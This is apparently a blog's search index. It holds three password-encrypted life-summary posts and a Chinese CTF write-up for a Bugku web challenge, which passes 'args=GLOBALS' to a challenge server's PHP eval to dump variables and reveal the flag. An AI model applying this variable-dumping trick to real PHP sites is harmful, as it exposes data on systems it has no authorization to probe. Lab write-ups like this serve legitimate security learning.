<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2022年3-4月总结（第01期）</title>
    <url>/post/f4915fa0.html</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉，这个密码看着不太对，请再试试。" data-whm="抱歉，这个文章不能被纠正，不过您还是能看看解密后的内容。">
  <script id="hbeData" type="hbeData" data-hmacdigest="31e864949deb0b87c5589bed6e0c445f953d14c8597e99b472a36adf69f37a83">2eeb050562cfb6091eb6af2e3dfa5fc4436960303193f7059af77b82d2af81c51b1113ce3cb0b49f31a063adc4c47eee32dd7d77666da8889290729d8bd768cdaea8af42462e137ea790187d76de0c138fdd2a1a137ae9c4e2fc72a5fc16390f13378c155928880ff887b7da7f6c78265e4d0154a3a1a198348c359e750aecea5f43da18f1710b78df9760a3b2903ede868bd99de42537090a829c1c5390469797744237e7dbd5fe5357b8c387abe3a1e3527882b2f213ec96e45e94674ef07cf459cff4e8e2e5d5a3fb61d1501d9123abef74ad535ee71255fd35e7c4f85c68846884ec12fa5e8d51905dd70ab492e2cb0a7e76de4597368ed09672d65484c869f25c3657b144fca522ccac74812c4fe65910c407f524b3984af32a769513c79b126ab88011419cda787ce66821c0aa5db340f323ee066def75f4318158c483d3caf4bb661f8b343c3050a3eb481807e444599c54e708d0185c95dcda69384dcecf08a6b55b3f2877b3110f07e873b21df7b3dead08354c1ad4254d2555a3d5718e454962e8d67f195aece9aa5cab32058cc09af1cc5253ef23c3bb0ecb910bc6b6443b37d95619c30b9aff4ba24e72a7512416f10981c17ea77b2b0947224ea888cb7fd33b1c4690d7756600eece46827fed53bad3def8d5503622b3e31e42d4004553a5f577065192bc4c9e6563c1343e25a3a8595f5de1bd20834ac7ac22e99a9b400896c86dce91b889011f8adf1e0ce140e0412bfaa42ec734fa6b915210099a59fe2161b1e9ceff66597b85189f4913c208dd70ba95acfba09b4c62b01767fb36296145f438627721ef5c6fe9dcae8c0063267ab5732d905006ff9d117c314fe024296bdc5735b3d60bc7e3bb3f29d7d4a380b926f0e4e6af43a19b5d68cd7e955c8a54f4f3aed542d221db718eb11673aac48da759244a276cbee6ad415992be5f8fee02fbe8dbaff7367efb5a0867caaf84c7d1b3010650093fbe658e8bf66135bf7c5c6e4f766f98338bec82c6f4d8af33b3ef79cd97b2f12a0c902994bd144c5b9c632593ffbcff4403974cd6b43517de82b33da54ddfec4b0a9385558045ad1b543a1248aeb9d693b93fd2d77758fdb023bfc808d9798ff55131e846a6435cc0013d98b12272f0088a29796d3e2996af8f394afecd6adea1750d80497283025c42d26e444a8afd1a40a93d2a8d04f75014bea75c8172b7a109d4dbab307c65ae037a335ffcded8caeb4228352b07cc86ddf199cd7c7fb04e285255d56ef329713bd932fb92befa8bcc86b18a4ff6cdf043a7efc01abf7acd469182d4213e1a8255fe774c6eef42694eef24db0ff1de29f2223b602841e0dfb5231e6cdf2aeac83cfe9bf719a0ee104d879403eb72b3baab13dba9d6e27b0c011096baf8344788c835b5036b7ad56ed07c3fabc2546a8f62bccc18ab092b8b9cfb23d6f7a3e715178eabe9dbd2e9505de02cf0887d80877c518fcdb8218d7b175151b10d1b4e6b856436343c32a78a37ddc65e485b0b7799bfa5c06b342971e83406bb8e2e883d9834c5d8cf66119919cc7e5963334604f3cf4c48697ada9b5ea0b33eadea1021ccda1ebcbd5868afda9b90127fd22e49c565ea0f71c1df925e745eeb108b049f81fd703f5ea4706c7ec975db4abbad6497497c8c72524bc2a4538996ab658b15d289c9506112f4ec3795a6db171a8cf9368d967373ca31f6b60b5c946f75770b405d892045b90e49f18ce46ae65a4c0094986e1f7bfc523aa838873e2acb60168eaeccc90d646dfce64835242dbc9277cbc7afc162fdfef26f9f5375e06b5c0931ea92f1cb2203f000d11a1fa039237341a386cb13d43453e37e4d6a966b028339378a0c1f47507c9a5c6ed9fe6ae30412de3cde2cbaf8e4eeaab1cc3d55f71b2ed1b118dd6f6239ac31878c13bf56a056465c8b4451d15f2bd0f1f0d6927f8800d9b7c75207f2e3acde3c7a77a17bdd79f78daa45d4f504475f4ed1bb9792602b9b942cb4dec64f2a95fa072efde7955a62549097b1daf0b0701d89c311b799bad0c1546401f3a49e2a07b3ea26727423576711d36e106f4aafb1a3f83a9c0962edb7cc223d1df84fe75c0d940c5e1c82445d1d1456c8face241625ed385e3ff0a8ca208a28e5417ae827aace2d3b6b652ef38151e671f29bcfdd060f817761c89abef667f5dc7aa333e88edc0e30a8e50561f312f9398f3aea64b81aa1964422b0daa88be94311eaa055db6de4c236883591a059ea6b75925bb33e28d5eb380e922264217eb76fdf71bae23907e0262b2d3bc19d298533b8ed0af6e52724b3d575b6b5766cf2d2e1c3a2e3b1046da1ec286989b3379d960e1a877c83925cc0f0165bf09052b0d5e056b1557373153c57e1dfcb602e04da87d6ffbbdfe01b6269cb24d45516752fdae3676a6f633055835165f4d69f2c212afbbccd9a87c92fdf1e138338a60813e53e7c12b12a07e6e786bf7de3482ace2a96bc2ea8de8b94fea74f0d86576a0e5c23087b9136dd7b921534642c068b23de7d2b45e5677e462e6429ff3a9e00490a03356e66de4f93805a7fd1b03a8d3f824c7167090ed23763d12555cdbd8d6eeb8cbc39d1e7393bd6757fc7608bd4c8eb9c1da046ffe79d0706140186759286c2a7830d01c5599d7179e120bd87f72780c878d27bde0bf9ad0473ea6ad3e7e5c5aa8169a3a8deb7ccb03ceb67bd3f7160db0dce852faaea85e5aeaa768afcc562cbf3b5b34af40f2bef1550d3d3c0e9c48e6bc5b68a596539fa360b85dc918b3ed3b2f15ba10d8ec69a1e0037eb7d59e8338a5bc6109280af1d232501f95642f8b924602d33742c805d4cf152bf82fa0252fedaf763d9e808ee76184519eb7915a76de1a57af24cbd8170175df9479d3f88c85a8382860c695bca2d37d77b337a5d463c734eacbad2d67b189b75f9802bf8175479438a411f99b749c5b68536857cbf7e6f765dee88ebd6988f089efbc10860e9a6e9291bc5ece3a9302c1eb61f29109e7069fcd7fb87092cd24a0cccf6ff7f7a7d1f128ac524da48724b0b1812a066f50942b124175b52ef1c5cf25bed92c4da1701fd736ec3e07243f36d59a6561395d3bd4edb838683ccda43f7c885d9da694fbbb5f3a3db60f0991683f179977fe28a0346e84f64554ea9d6034fc59d04259b2f1d939c281b2f10c0f4f7414d8a95f888f4b3fa2e787478e66165725e0cb47be04ed536a0a003287d6860b39e997d73fdf23e72d31d79fb514ebe369215a4ca7abc62423ef777a1d75add7cf94f7166c41c991f188e3aa7b2bd96e57c5fa5ab3538194e69a43156d2585fb2b719853f84b7f9e3e384025cf78f71c00fdc5534281b401d67b194aec4b26612413fcd0af861c34be7c316d34c7a3f08b48fe02b60b4983236bbd1d12edc785ce5953ee9affcc5d9e1990967dd23322c1fc4f64c4d735490b922bb950ea9c004ffcb5eddd225da9311edafb3753005f79e19786be844ec4b23b11bd727fcbd1fd5a8111df359a25810b26147fdecd1d1333bff138bf4ffdd0b43e80b294b46bd9c1b5c2d63efb5c42faaa5aafb9f9b188de9750bb703db1af69fd282e2e6092d72e8613514d7b0dd368c5b55e20946f4c01547201b5223bce972d4c7d2e97d87e7cdd5a475b601fa55ce136ab461d8854c2b533fa341d49571bf6806a436e26271dd5edb859d41c22bf836fde791ab4c60c6a69d5ba19e662b76b27cc14b7187cdf2e070ed0412f087b30c83c3df9511159b2e48edcd94fa3a584f0488e44203d9be100c629c6eb7d191b2e68add07bb76144dca3b0d186fafe1cc48166b1ceabbccf3c28b84b17062746fd593f9adc9f9b0c102bb107e1e8b49c5a48b260c37453b49eca0460541dda230dd260529c57e687717ae8b561bfb4b87ce2e68c5585f485d22586222a2a5a94c626caae7d0690f9d09a6ab67f94413c96d44d3806e2c71c3fffe1fb002e1eafa39cf32d70c36f2216b68129042cacfd599bb7267c99913140919498bfd07c63527a5edea1c57d92baccf127498b85d047875965350fca207dccc0d2af3203e540e4deddf29cacf35f24309cc0b547cb2675948e3a384d4645e6c0980e6d43eb652d49f6de1627617e17baaaae7d73a258db5ec4ff159f4de1ee79aee2cfa7695206d5e228034d3c63d0918620e5b8f5c0275b91309019f203143383e8fafea4ecc66634e555dc58aed3d2699da4dd515932142688d65fdf2c8f06497d6ea6f5b0d77699ff0fefa4fb82f35752186ab24aacad953b5031ca09fef759998099594436c6a36d48d6cfc455b61b248f874b6ca1e5a8795bedac962e56fc294d649a5705efcc279fd9e695c3c1a131f44f5b80fe5233f9153c3a86dcd639c896030fe7dadb0d746ed67c2c7db3dbf29e8429a95358f943336db1616c0e7b54301ab1f085fee085a49a923c14cb1272a60b52f9a75b2cd25c8339c6419e0d168ddab89f51f884cd2c07877b6d3a5ba38a0b9f65a6ba7a346743d2e2e660d9eab2b7646e5de6ab51db428a7fdf1e9c28f9d3f7bdba44fbb146d80297ad1801c8f29a87dfabc45a4771596a5265dfe797ddd8fce681ebe6369575b9d0dda6510994bd2595e0b7169bce0ba749e542b51165459ce372ddd2efd9d77b5612571d860bae3718dacdaccc7a205f92a198c40856ab5498f32f5aa49457b54751d9e2880e6657b6fe628c7d6f8dd910545c67cb661e4aef8206a7b9c06b2dd24be065dc195eebe140705e773c0299b3b6efbaa65b70425b6e97b66be811ed26c939e45c23a05c176994c6377995a20f09835aaa022a99549cd7c7226df63a681b5ff53d8b135cc8f51a9c6dfb2a5e3ba3ae6d96357c99abe492371f586b8a48a75e9a003e1dc205bd8f8c2b5b006b7b65f5252a6476684f004e4bb3e81f08fc930053e824ffb35f35a0e90cf4633debabb1a0a48750217405ef63517fcd7cf646dcd94220338d9606ef06015f00879643ab76991007b1113e626d87ca5616fac7ed35afbc9fc26e6138b9ee5de1bd38e050d39c6aee609783ce86b267e811cdb786f9757c5690b50f3fefda3c427c8663ee1c10f69af6df3cb151a9648e2b1a8e39f2b3987a329949a208802a19f9f56f52ec823a87a6301eb8e147aacfb52bdf12ad3b74315877fbd5ffc021002d1cb5d989d1bd13808ad9741f69ba738c6234a437f7e4504a41731576fb2cbb9f095982ec1c0e63b697d9f6a35a6552b0c0f5b0f968ef6ade96c493b37830192a7e6926224f46d0df55dbb2e5369ce0887e41982725251eebf657cf2969259aee930bd18a8684a3038f70afde88f3b138505e20c7b8683ab0976d63e686bf404144b1a3763cb4ebb05005993747ebb15cb6189748abf67354af9a829768f1f8bee883a8c0e2ca6a563379f052e0e45124c1ad56f9797b55dbf4dfd4b5cb70c77cd3eb52de43aba7d52350ffdf2c8542e24c96f8ae0fc3316935264da9cb2997db6c7ba6f202a0faac67fb402b5c60e76016a70d66ee11983cf3849ac338df13fd1283902c81c8ab653973eb3d886f4d122853b4293cf2343b3d5d8bad49543706db5fb5907967f69f7032c7033ca2c34f80ae8ad298ca4063102ccf4c0e0f99b6353596c468db6578a83dc891230b95749989a6356de197cc0844cddc37eed7f984d09a731d22da8ac076416eb9b1cb5d8f51439eb7a93bddf52b153c80fcd806acfcb3e5f95af85a7a319f7cce72308cdb6f0994b4c94f2cbbfacd9b519f8ebb897a873d88590a5c47ccaf35d0d133c35452edefef9e5b8fddb15b2f6be0c2608808add5ef1bb8f2142c73e5854d5be24d0f8cca1cecd29a8864d241f10b06e3708dce4f16073e0356437478721f3cadfb23c3d12d913bc5c010daf390d4ecf267fd5e6b7fcec13f1ab33f5486ddc4ba04175a08247831c1b63ca46cfdd350f2176a81678ee990178a97048d36510486361c5b7fbcf198ee265e4676daa18b35083c606280a7f653d0c72298b69c1b4b168ee520d95a8daa3d0a72e22dab46ff7082e2b1b28117fb77a565c5a13cb5f73a31ebb0cdbcf7902db0a92fe2d4a7a9d6ccdd08d2725fe5389667a965b08f1ddb2dffbf93f4cd8a0c55278f41f68907e95efc13149a23ab861669815f25b53461b459e29c98dd6dfd5f70abf13e8a453559a98fcdc720859aeef5bbd77284dea27b15102c92e1e2bd29a5296cf9c2a2a41c15f253ceb88e31e9e560bffe3637f06267298aa588bfa54cff684e5288ee50f500ce3592e97cd4f6958d232557d716f55e82d6789e540074c813d43935d132aba29b68d13cbafd2fe99bc6b6a5a854cfc23507ee4b67eb36e6d13ba3d0dde999ce4e4e866b6dfa38f5261a69c7dd6cfebb92998988a01cafc824de6ca5a96b52eb60511786f0806bb39cd4fbdacb4bdfdc8bce19e150443403ff2bef4d10335ad88839b2a905be06eb64d5910534430dd532069a8b622451e386f52a1556a09619f5cc51866eb6b287c60c02a4d13ccf82c1fbf27531284ffd52ff9829ced30d8bebe100358bf586d9b7656424c347934c0a9c5f5ea577c76b03423c2eb4df880b80d95d1c8e7c77b6e3cc0b740585e56c092122394cb4086b3a45a7daf5551582321d6f222f31d3186706fd7d03f38031afc2a484e8079acf178f253aa059549495f0dd07aa3dd74088508a9fa0a69f4eda0dd531018dbbfda8842eee0f3cfaca4fd990db44fbeb3a7d545b60ec6f7df1ead6a6c9dad004991674a314335507a106a084aa14b8aaaa67720d16b0f3c075d51c9700a1d782d8d7f6f1e4d535e4d786244acc607cd1b3bd42543bd0d65bdaf07abb6a836eba31da8dc4571ef4e3c891fa6e6be616ed2acf18447b98caffdb58faa501253e4885279d16d2a4a76b64bb1972ed9dc496a154a8db4ff978b2b3afdf8236037d649b55712fb4d50fa6dbcf4fc9c79ab87afd4dd92e07d9abcfcff577a2256662022cf86b5ac9e99639ffdd380967d3c271172b307d69025ce901bcb5dd9de2b1dcc0fad61e55bb01829c42061f4e502d059a31f07266e967c88f645e447b91f9197c6e9f065ba17072b7d2bbc64e1ca0e34d83687ad3f97cec4f7141c8f97de87e66019e7872df916a38137531fabf16312d772295294102bcd0990be23ad090394f8b672e76a5cbc17dac6bf3b6ae5641d6a5ad9e54da50c73710d5a954979ba1fb472c9b40ffaebdcc690a6ded01993e8645d8c26727985f34ba482ecfdd1ee1bf7286ea4292de325134449295377b36f8460b70b105a9e41192baaf99e9b46aca4d3cd3a063f79f317bbf3037c73cb88d5a80209746b1883565b87ea6632f539c73f17efb9de55c2a654d934edafe17ee020888b8b47b30a8725bae004d9c127c4d8be8526205e95a4a5d8f46c630e151f9f9664f31375dc6b5f72a05b6d613a9c6e4bedec11609bc43a31a5a7ec6b8f7065e0ba35bda9e25a77285deac4d4fdb8a995ec29a92db3dabe63aa987957563bf6fed51c36ac0c8750d7dd2824e87146e4bd2b23f61d7e61cabd484de16a3b93ee27f5505743011cac8c106af7a88fa2cae9660cdd8062197c21b7743b606ecb3a3f728f718236ccab0f2e707c4fd1e4e0e09ed97a4940561f373acc3f978a8beb36d14d3006ef376a545d2066fdc53c19952f3db7dfa582f676cad8cf5956cf7eb1508130d9f23411a6e3d7f95fe78430ce63e60fd54f46c229b8a0a7b827ea5e97b20352459712ebe7e37bc5e9eb602d448e41b765d2d9b9a84b9e4076151a50292783877c691513ca69bc299e980a2990420abba8cf7433346183cdb52ed66efd5b850111a01a254765939b33595107e4c1c29bcb1893b8a963bfc4209c7e37d552770c5518c3570e73d94269d8730ffa52362d3d51fdb214302fa14bd9a30c13398cf48a9028664bdce9088ef64b92ab3e0fe02d392eafaa6d14d43a2a05515b98a07273074d35034dedb7390a83e590f4694479bba8ae1f768cd08d7069dac4c8d6976fbc425501de5470c8f41ee6d8fdc0f71dcf2ee3e15e0cb3b87dd06522e9b990becbd6b0b800fe3a04853a8a3fd3a606b3c71ad119e22c727a1a82ebdc2777a5068a735db939469cda635649893921cc87b8b89974b42605b0da0f2bb51620743999f253c3dfd6ba414adddc893ae80c9aa74af80e1e293451979b79198eb13d29efe84afc27be492f84bdb6489ec4513719ac637d78974914200eee9b045f19d6b337148f91901ac2c2b13a6e6f35d7bb6b62d6e948dd002571ce3cee514d327e9a6b90b424214b51bc24a6ec4ada2637f712b857096feaa0492e9cbb639ec58e392b11bc6b8a43d8787e15d4ef3de7697c5e76d8f51d1aa93db0e27beb5bdc99d40f5c48bf90f3d90cfdaa4e260e96d09a02293eb75243937b8cd95ea7b9ef73e52d0d24326776aa128f277d94cd20f8ebd2251fb6fc2231c0fe35b0782f17eb17b37fc5e33a9a80e22853451d3ef30a0f98c56fcae2b6b54d5b9293a324bccabe592fc444626783e69d41e475e82f2c059085c79cf12ea5280bf6622e9d9ec7fcf0e7a309263eb7943a89dcd517e516a27257452827c2a172e9eb4f3bd4392055e1d6547b18d311242ee6c3150a84268a20f54d86fb07e9145c4deaddf0fc97c64a07e9813d3ce0caf940b6a7d5cdd8f81241c48ee5b0a39fecf36f2c66b56ef14e85eab726d76629e6b67bd5584a93cf109430dd768d1b680e42915bce0f6244007473617c049fc8550349dd990fa3cd55a5cb906753c2290b311ae6c691132f230fef9af30974ae882c7e44ecc86be97817d3cf4b1fa5777712dd8cb02eba382b3b21636aa90ed7def23b6c5abe2df11a0504c72b83f24c03a3ff6332eb7be948aa7339ab6f4fa79e226598e479c193233d13c372723d610bd2e491c04a243d1238306994de87a2b3e6c29368ebb2c301527180ccf22e213b10690303f94e290913140c5022dba84dbe47bea05d88cc695f66b68b4d901461a35dbd501899b1caac92c56e2a9e3cbfe54387162e67918e99de411657d0257f0d0198c62876d3a04c507bf70b8e904a8254538aa21e2866ebda5fd22ee53d4da57c474f2bd47ac621807b95e0d598e9ddc3263c19f2ad14500ca6938b558407da818284b55a2e01ce1efdd76a2c9866714d3d29a88ce01c56e9b067c6f4ed1389bb5ae71b011d86fda80dc73737399a3312db3eee44f76023150efb5605ef9dfba9402ddbe757402933745613819306f8579fa62ca0608a83e8f88859d519cf669f3f464e26da60cd7936fd0da16da9101ade2d5580390a1a016a976307a2172103167ad60282a02df99b781a7671b79d37256c7fce4d736cf5e153eb1fe12c317d37364717cb8fd1aa5430c9387dacb53051246af65c4bc21487886c8131d44ca7702a70086d79e06b1560a1185fc43a8b5961788a25e75077bede6a9247132227210f42adc431c3bbfc69641ffb4a68758387b9f025813281fc9f73bfd5d5ceebf732a2283c338827a5932f9e6e5817fa2962a764b720991b04e510ffca58cf3a80e11666350dc7e869452333391645be3652914b88a45cafddbd10ab68a58dde7b686334d66e9e76cce36e8e4d23fc32408268d4f0cdacee917f3191cd8e9ed992b13dcdfd3a023962aa5a935afe8fe3da372b3e2969762fa14e5bbc6e2d9fa5fc2b7ea4a21888f16e503b42256c28b292d60e4645490c2eebc751db536206b26414946409296b26fc112cac8ebefe45d45d9a408e325d432436fed4fbc2f77474f22a25ec81fa476873817483d00d68570976f1d855f4926ae56b02414c2fd2195903669a108f66b884d220093ed2bbb9f957f7adc002bfd5480cee3f1f01c8d371e5a1323ff55fb78da7611b429ac0d03dc18419346d94671a2a9c1fc43462f05423ca41ba3cd8392d80294f7b90803e1e0dbadf06e6afb8b295378248e036a4ed47c912f8d883e7b0b36846d43fdb0471423969d6ceafd952d0e26b2accad14185254e9ed9e870ad84a5ae2e9508fbea675bf956b64232a5dc5986490a1011796a7c9dff42e2443bb560c1b589253c43d8801149a1c2f0474ad9b092618b99b6638f57cd7ad2094cb4204390ea59764107d83ce675fbf19846230936e003a1a687447777e6fd59495318ac5bdbdea2879f9265bdd6005fb2ea06ace5c47c8219c52a4679283c455b4a786d8eb9694d6eedc737068b63ec25568f47e4bdfdc51a9167f0d47d9d03a98dc4e6d78ceec64800c01ed7d9d99b0b31e19833c1cb0c55062ea639130277540cef69871b3a0bc01e6669877e62c95f923eb1ca5bd7fa7925e73d24bc2899a66b32022da656db8f718ead96eab1098c97c9fd06afad06c1552b0017240198f753bb92534d8bf048dfb173a88e3c05d15eca7b222d2b41f0bd5caf63687521a4a75b7f20967a36f4bd644eda6b4a0ecf2a5ca92d5fcf749e4c8f7e1f8d9f8259ae6135443cbb8cc3622d35ae5cd79e0acc34b7f5a0e863ceb8d6b38f055c0452f28e20e4c76363d3a5f5fc79ded4d11a8e5e2d301c3e90f3c2ab99065a2b0adc3c1a78f51ae403b0c665c06a9fd3259beacee3648b60740bb21bd9d0b0d9107cd11b400b13219616cf261fc2630729b4cd070680a135344f7a63d2862b50227186d2655f32097867de3337ffa41e73962c1f09a800b998d40225a36a6376ee0b1bdea32c0f862dd66f2232d40365e671c97581d288ce105c1ba5db84c6e4fb7b61940505ec1f4a2bd82bf734f15ac5a0ceb04890e35b695ad59a20e77a362b470a2e0d27611d62b793634b417a320ccd2b73be3f38a66ba937f67d93e24bf2fef51e620df7c396137f9a3fe308268b9e7ac97f568e7e3ee1e4ce8ab0078cc0c23b3134dfea0c897b21a70a59a77da904fb734e09aedba3212ceff72040267894fae2147bdedb2dd7b2e7ecc51b20c8505019ccbe8ea65d17e749c7c8fe08a48e6809e2b4b4db62e734b00d20e44f58928d710997129a03bba46c48d28ef8dd55433e8a543431971eea39536454d50edfa3ddb0aab9cd2a3b1865b73431ce471902d7be1c9bc6c0e7dc702385c6113fb11a59e00b98375bb0c5c2e2b32fc614579f0d37c1fa8092a110c7a3e9dab6f9ef79a39752812c7a1697750af548b7f61a17634926a111c61f6a43a538a829bbb27ce3f53a08c857c03964c9f5dadf35eb0a2afbf3ecd0cfc5553405f63a054c90d1a4b51985fae566fce5f0eba9fd69698dc27bc62e0b427c457fb7556e56b809249c1d94f18eadb70d66229690c83f4bad053acb9dbc7e64a3fb66c902bea1b77aee59b55151d7d6685747d3021573a03e8d57b36545706271fbee766ee4aabbab1b9b73ee52a3d00130749b88d0ddb9965475474e7acdbb14a634230c7d3eaa16ae7271c928387a1494dc59a4f3c94130992601862089bae4be5893c35ae6288d46b77040e63440652f9be90076b88b22ce18ad43c65cac21ec721b56a0be64b68fe07db288e936ff0e6323766d3309a7ab79264b35a181baff789e8103785ccb2b4fcfcba575678beb6fed177e614cd5b190b8199f2e6ff1aa15ee657bf7073d719e4a474184212553c2c2e3f5663893de02cf5fb672c4e9d328cb7ee6194e7ff1d331caabc98e5900c3e73c58874bed8e6909211c2f6784c7c8559242103d4420af4cba1da2f1e605d21ccb262349d2fd848fc765f7d19585d5ac3413269ae408feb09854ff5cc0ec141b8f6033ee19c9988cff4718be1081800de2e4c54fd461e7ee7c0496b57837bf48a70cc2bac43daf64afb78af5b11f0612ae4d78db730b71a691798f6d91d6a5b4d27565d3efc54a9217c26381e822211add5c627ec161267b24314bf73550bd95d3634751882e2f351cd143db2ebc5992659dfa36bf385c81036a0a3a666e80ba11570a10724cfa6a1410a6ef6ee14262147dc29bb9e214bac691932611ef4779aed3affd73f1efc3e57ba05721b2d6f5a958657698d5ace6dea5b64e2434eca3be57f48bab8261d11b7ff5202668e6b8d208e5aaea4b3dd83c4cbeef61ec47e47b4aba583e95f35178f33dc8d34b22519c34c03f333ee92f7a8711dbec31ef7b5e75fe7ce4b89cea867ba649f034c82b2004d736a03a39020540a4f0cb9cba0cb06ab21750fa10834c83d1d99cdc0969fc43591ccde6cfdfe85d4171202d441bb7e0a17085ad4e23bf5060d426bb112a576dcfb61bef644365b8543fa23ee7ab806d320fc2992943be0144122e4a7c7c1868855b35ceb2e07285a6fb041ea4069ffe7dca9bd22f3f657e06099d67e0fe8078ada6163db2c4204d7a3c99c3b91aad6cde4d66283edb0bf756843a11fd96a3beeeb9bf4af7ec273b1b5917b009aee7709750b65f85c889ed6912b0a2d927a8177ce771e8d2fa9c82fc22d9ae8402bbdc881421e0d4d508b1291b3e685d575fbd9fa799d5647dce34e09290c80d8bd25c2778ec8892dbf1e245739b45418b8ad9ab2b171e19b3625e31887b95b1b7f8043ebf9bc0d9034921a54598337b38c5011b060bf2f297980559a7704675efd8d509b941cafc27abec2ca88139e564ebb9c3ae9bc5da082818093d4850c11e2931a6bf0bc549e44a8519abab50c2befde49c1c7297ff4861adea308df34dc854e374b0835268f599ee27bf688f9ff0183ffd7a5acb039b8fe999a</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好，输入密码才能查看此文章。</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>生活</category>
      </categories>
      <tags>
        <tag>生活</tag>
      </tags>
  </entry>
  <entry>
    <title>2022年5-6月总结（第二期）</title>
    <url>/post/1f592a7d.html</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉，这个密码看着不太对，请再试试。" data-whm="抱歉，这个文章不能被纠正，不过您还是能看看解密后的内容。">
  <script id="hbeData" type="hbeData" data-hmacdigest="96037093119474877c5b096ba41902e9be2899d6b773faaac91fab15cde7ce6f"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好，输入密码才能查看此文章。</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>生活</category>
      </categories>
      <tags>
        <tag>生活</tag>
      </tags>
  </entry>
  <entry>
    <title>2022年7-11月总结(第三期)</title>
    <url>/post/4bbafff6.html</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉，这个密码看着不太对，请再试试。" data-whm="抱歉，这个文章不能被纠正，不过您还是能看看解密后的内容。">
  <script id="hbeData" type="hbeData" data-hmacdigest="30ade0a9d87d05dadbea4c2d9ce92a60366353caf0d311c285f29ade033a8a5d"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好，输入密码才能查看此文章。</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>生活</category>
      </categories>
      <tags>
        <tag>生活</tag>
      </tags>
  </entry>
  <entry>
    <title>Bugku-Web-变量1</title>
    <url>/post/55589c6e.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、考察方向"><a href="#一、考察方向" class="headerlink" title="一、考察方向"></a>一、考察方向</h1><ul>
<li>PHP的<code>$GLOBALS</code></li>
<li>正则表达式</li>
</ul>
<h1 id="二、PHP预备知识——-GLOBALS"><a href="#二、PHP预备知识——-GLOBALS" class="headerlink" title="二、PHP预备知识——$GLOBALS"></a>二、PHP预备知识——$GLOBALS</h1><p>&emsp;&emsp;其中提示flag在变量中 “flag In the variable !” ，这里要普及一个PHP中特殊的变量</p>
<p>&emsp;&emsp;<strong>$GLOBALS —— 引用全局作用域中可用的全部变量</strong>。</p>
<p>&emsp;&emsp;<strong>说明：</strong>一个包含了全部变量的全局组合数组。变量的名字就是数组的键。</p>
<p>&emsp;&emsp;<strong>示例：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#示例代码</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$foo</span> = <span class="string">&quot;local variable&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;$foo in global scope: &#x27;</span> . <span class="variable">$GLOBALS</span>[<span class="string">&quot;foo&quot;</span>] . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;$foo in current scope: &#x27;</span> . <span class="variable">$foo</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$foo</span> = <span class="string">&quot;Example content&quot;</span>;</span><br><span class="line">test();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#结果</span><br><span class="line">$foo in global scope: Example content</span><br><span class="line">$foo in current scope: local variable</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;注意：</p>
<ul>
<li> “Superglobal”也称为自动化的全局变量。这就表示其在脚本的所有作用域中都是可用的。不需要在函数或方法中用 <strong>global $variable;</strong> 来访问它。  </li>
<li> <strong>变量可用性</strong>。与所有其他超全局变量不同，$GLOBALS在PHP中总是可用的。</li>
</ul>
<h1 id="三、代码分析"><a href="#三、代码分析" class="headerlink" title="三、代码分析"></a>三、代码分析</h1><p>&emsp;&emsp;页面如下</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1632486229240-188bcecb-d4f2-47c2-9b87-a8f58a715bfe.png" alt="image.png"></p>
<p>&emsp;&emsp;其中正则表达式<code>/^\w+$/</code>，意思是只能有字母和数字</p>
<ul>
<li>两个//表示开始和结束</li>
<li>^表示开始字符串</li>
<li>$表示结束字符串</li>
<li>\w表示包含【a-z，A-Z, _ , 0-9】</li>
<li>+表示一个或者多个\w</li>
<li>后面的i表示不区分大小写，在此处没用，因为\w里已经包含了大小写。 </li>
</ul>
<h1 id="四、解题"><a href="#四、解题" class="headerlink" title="四、解题"></a>四、解题</h1><p>&emsp;&emsp;访问<a href="http://114.67.246.176:12610/?args=GLOBALS">http://114.67.246.176:12610/?args=GLOBALS</a>，看到flag</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1632487926975-c718606e-dab0-4418-9dbf-6e84e2a664a9.png" alt="image.png"></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
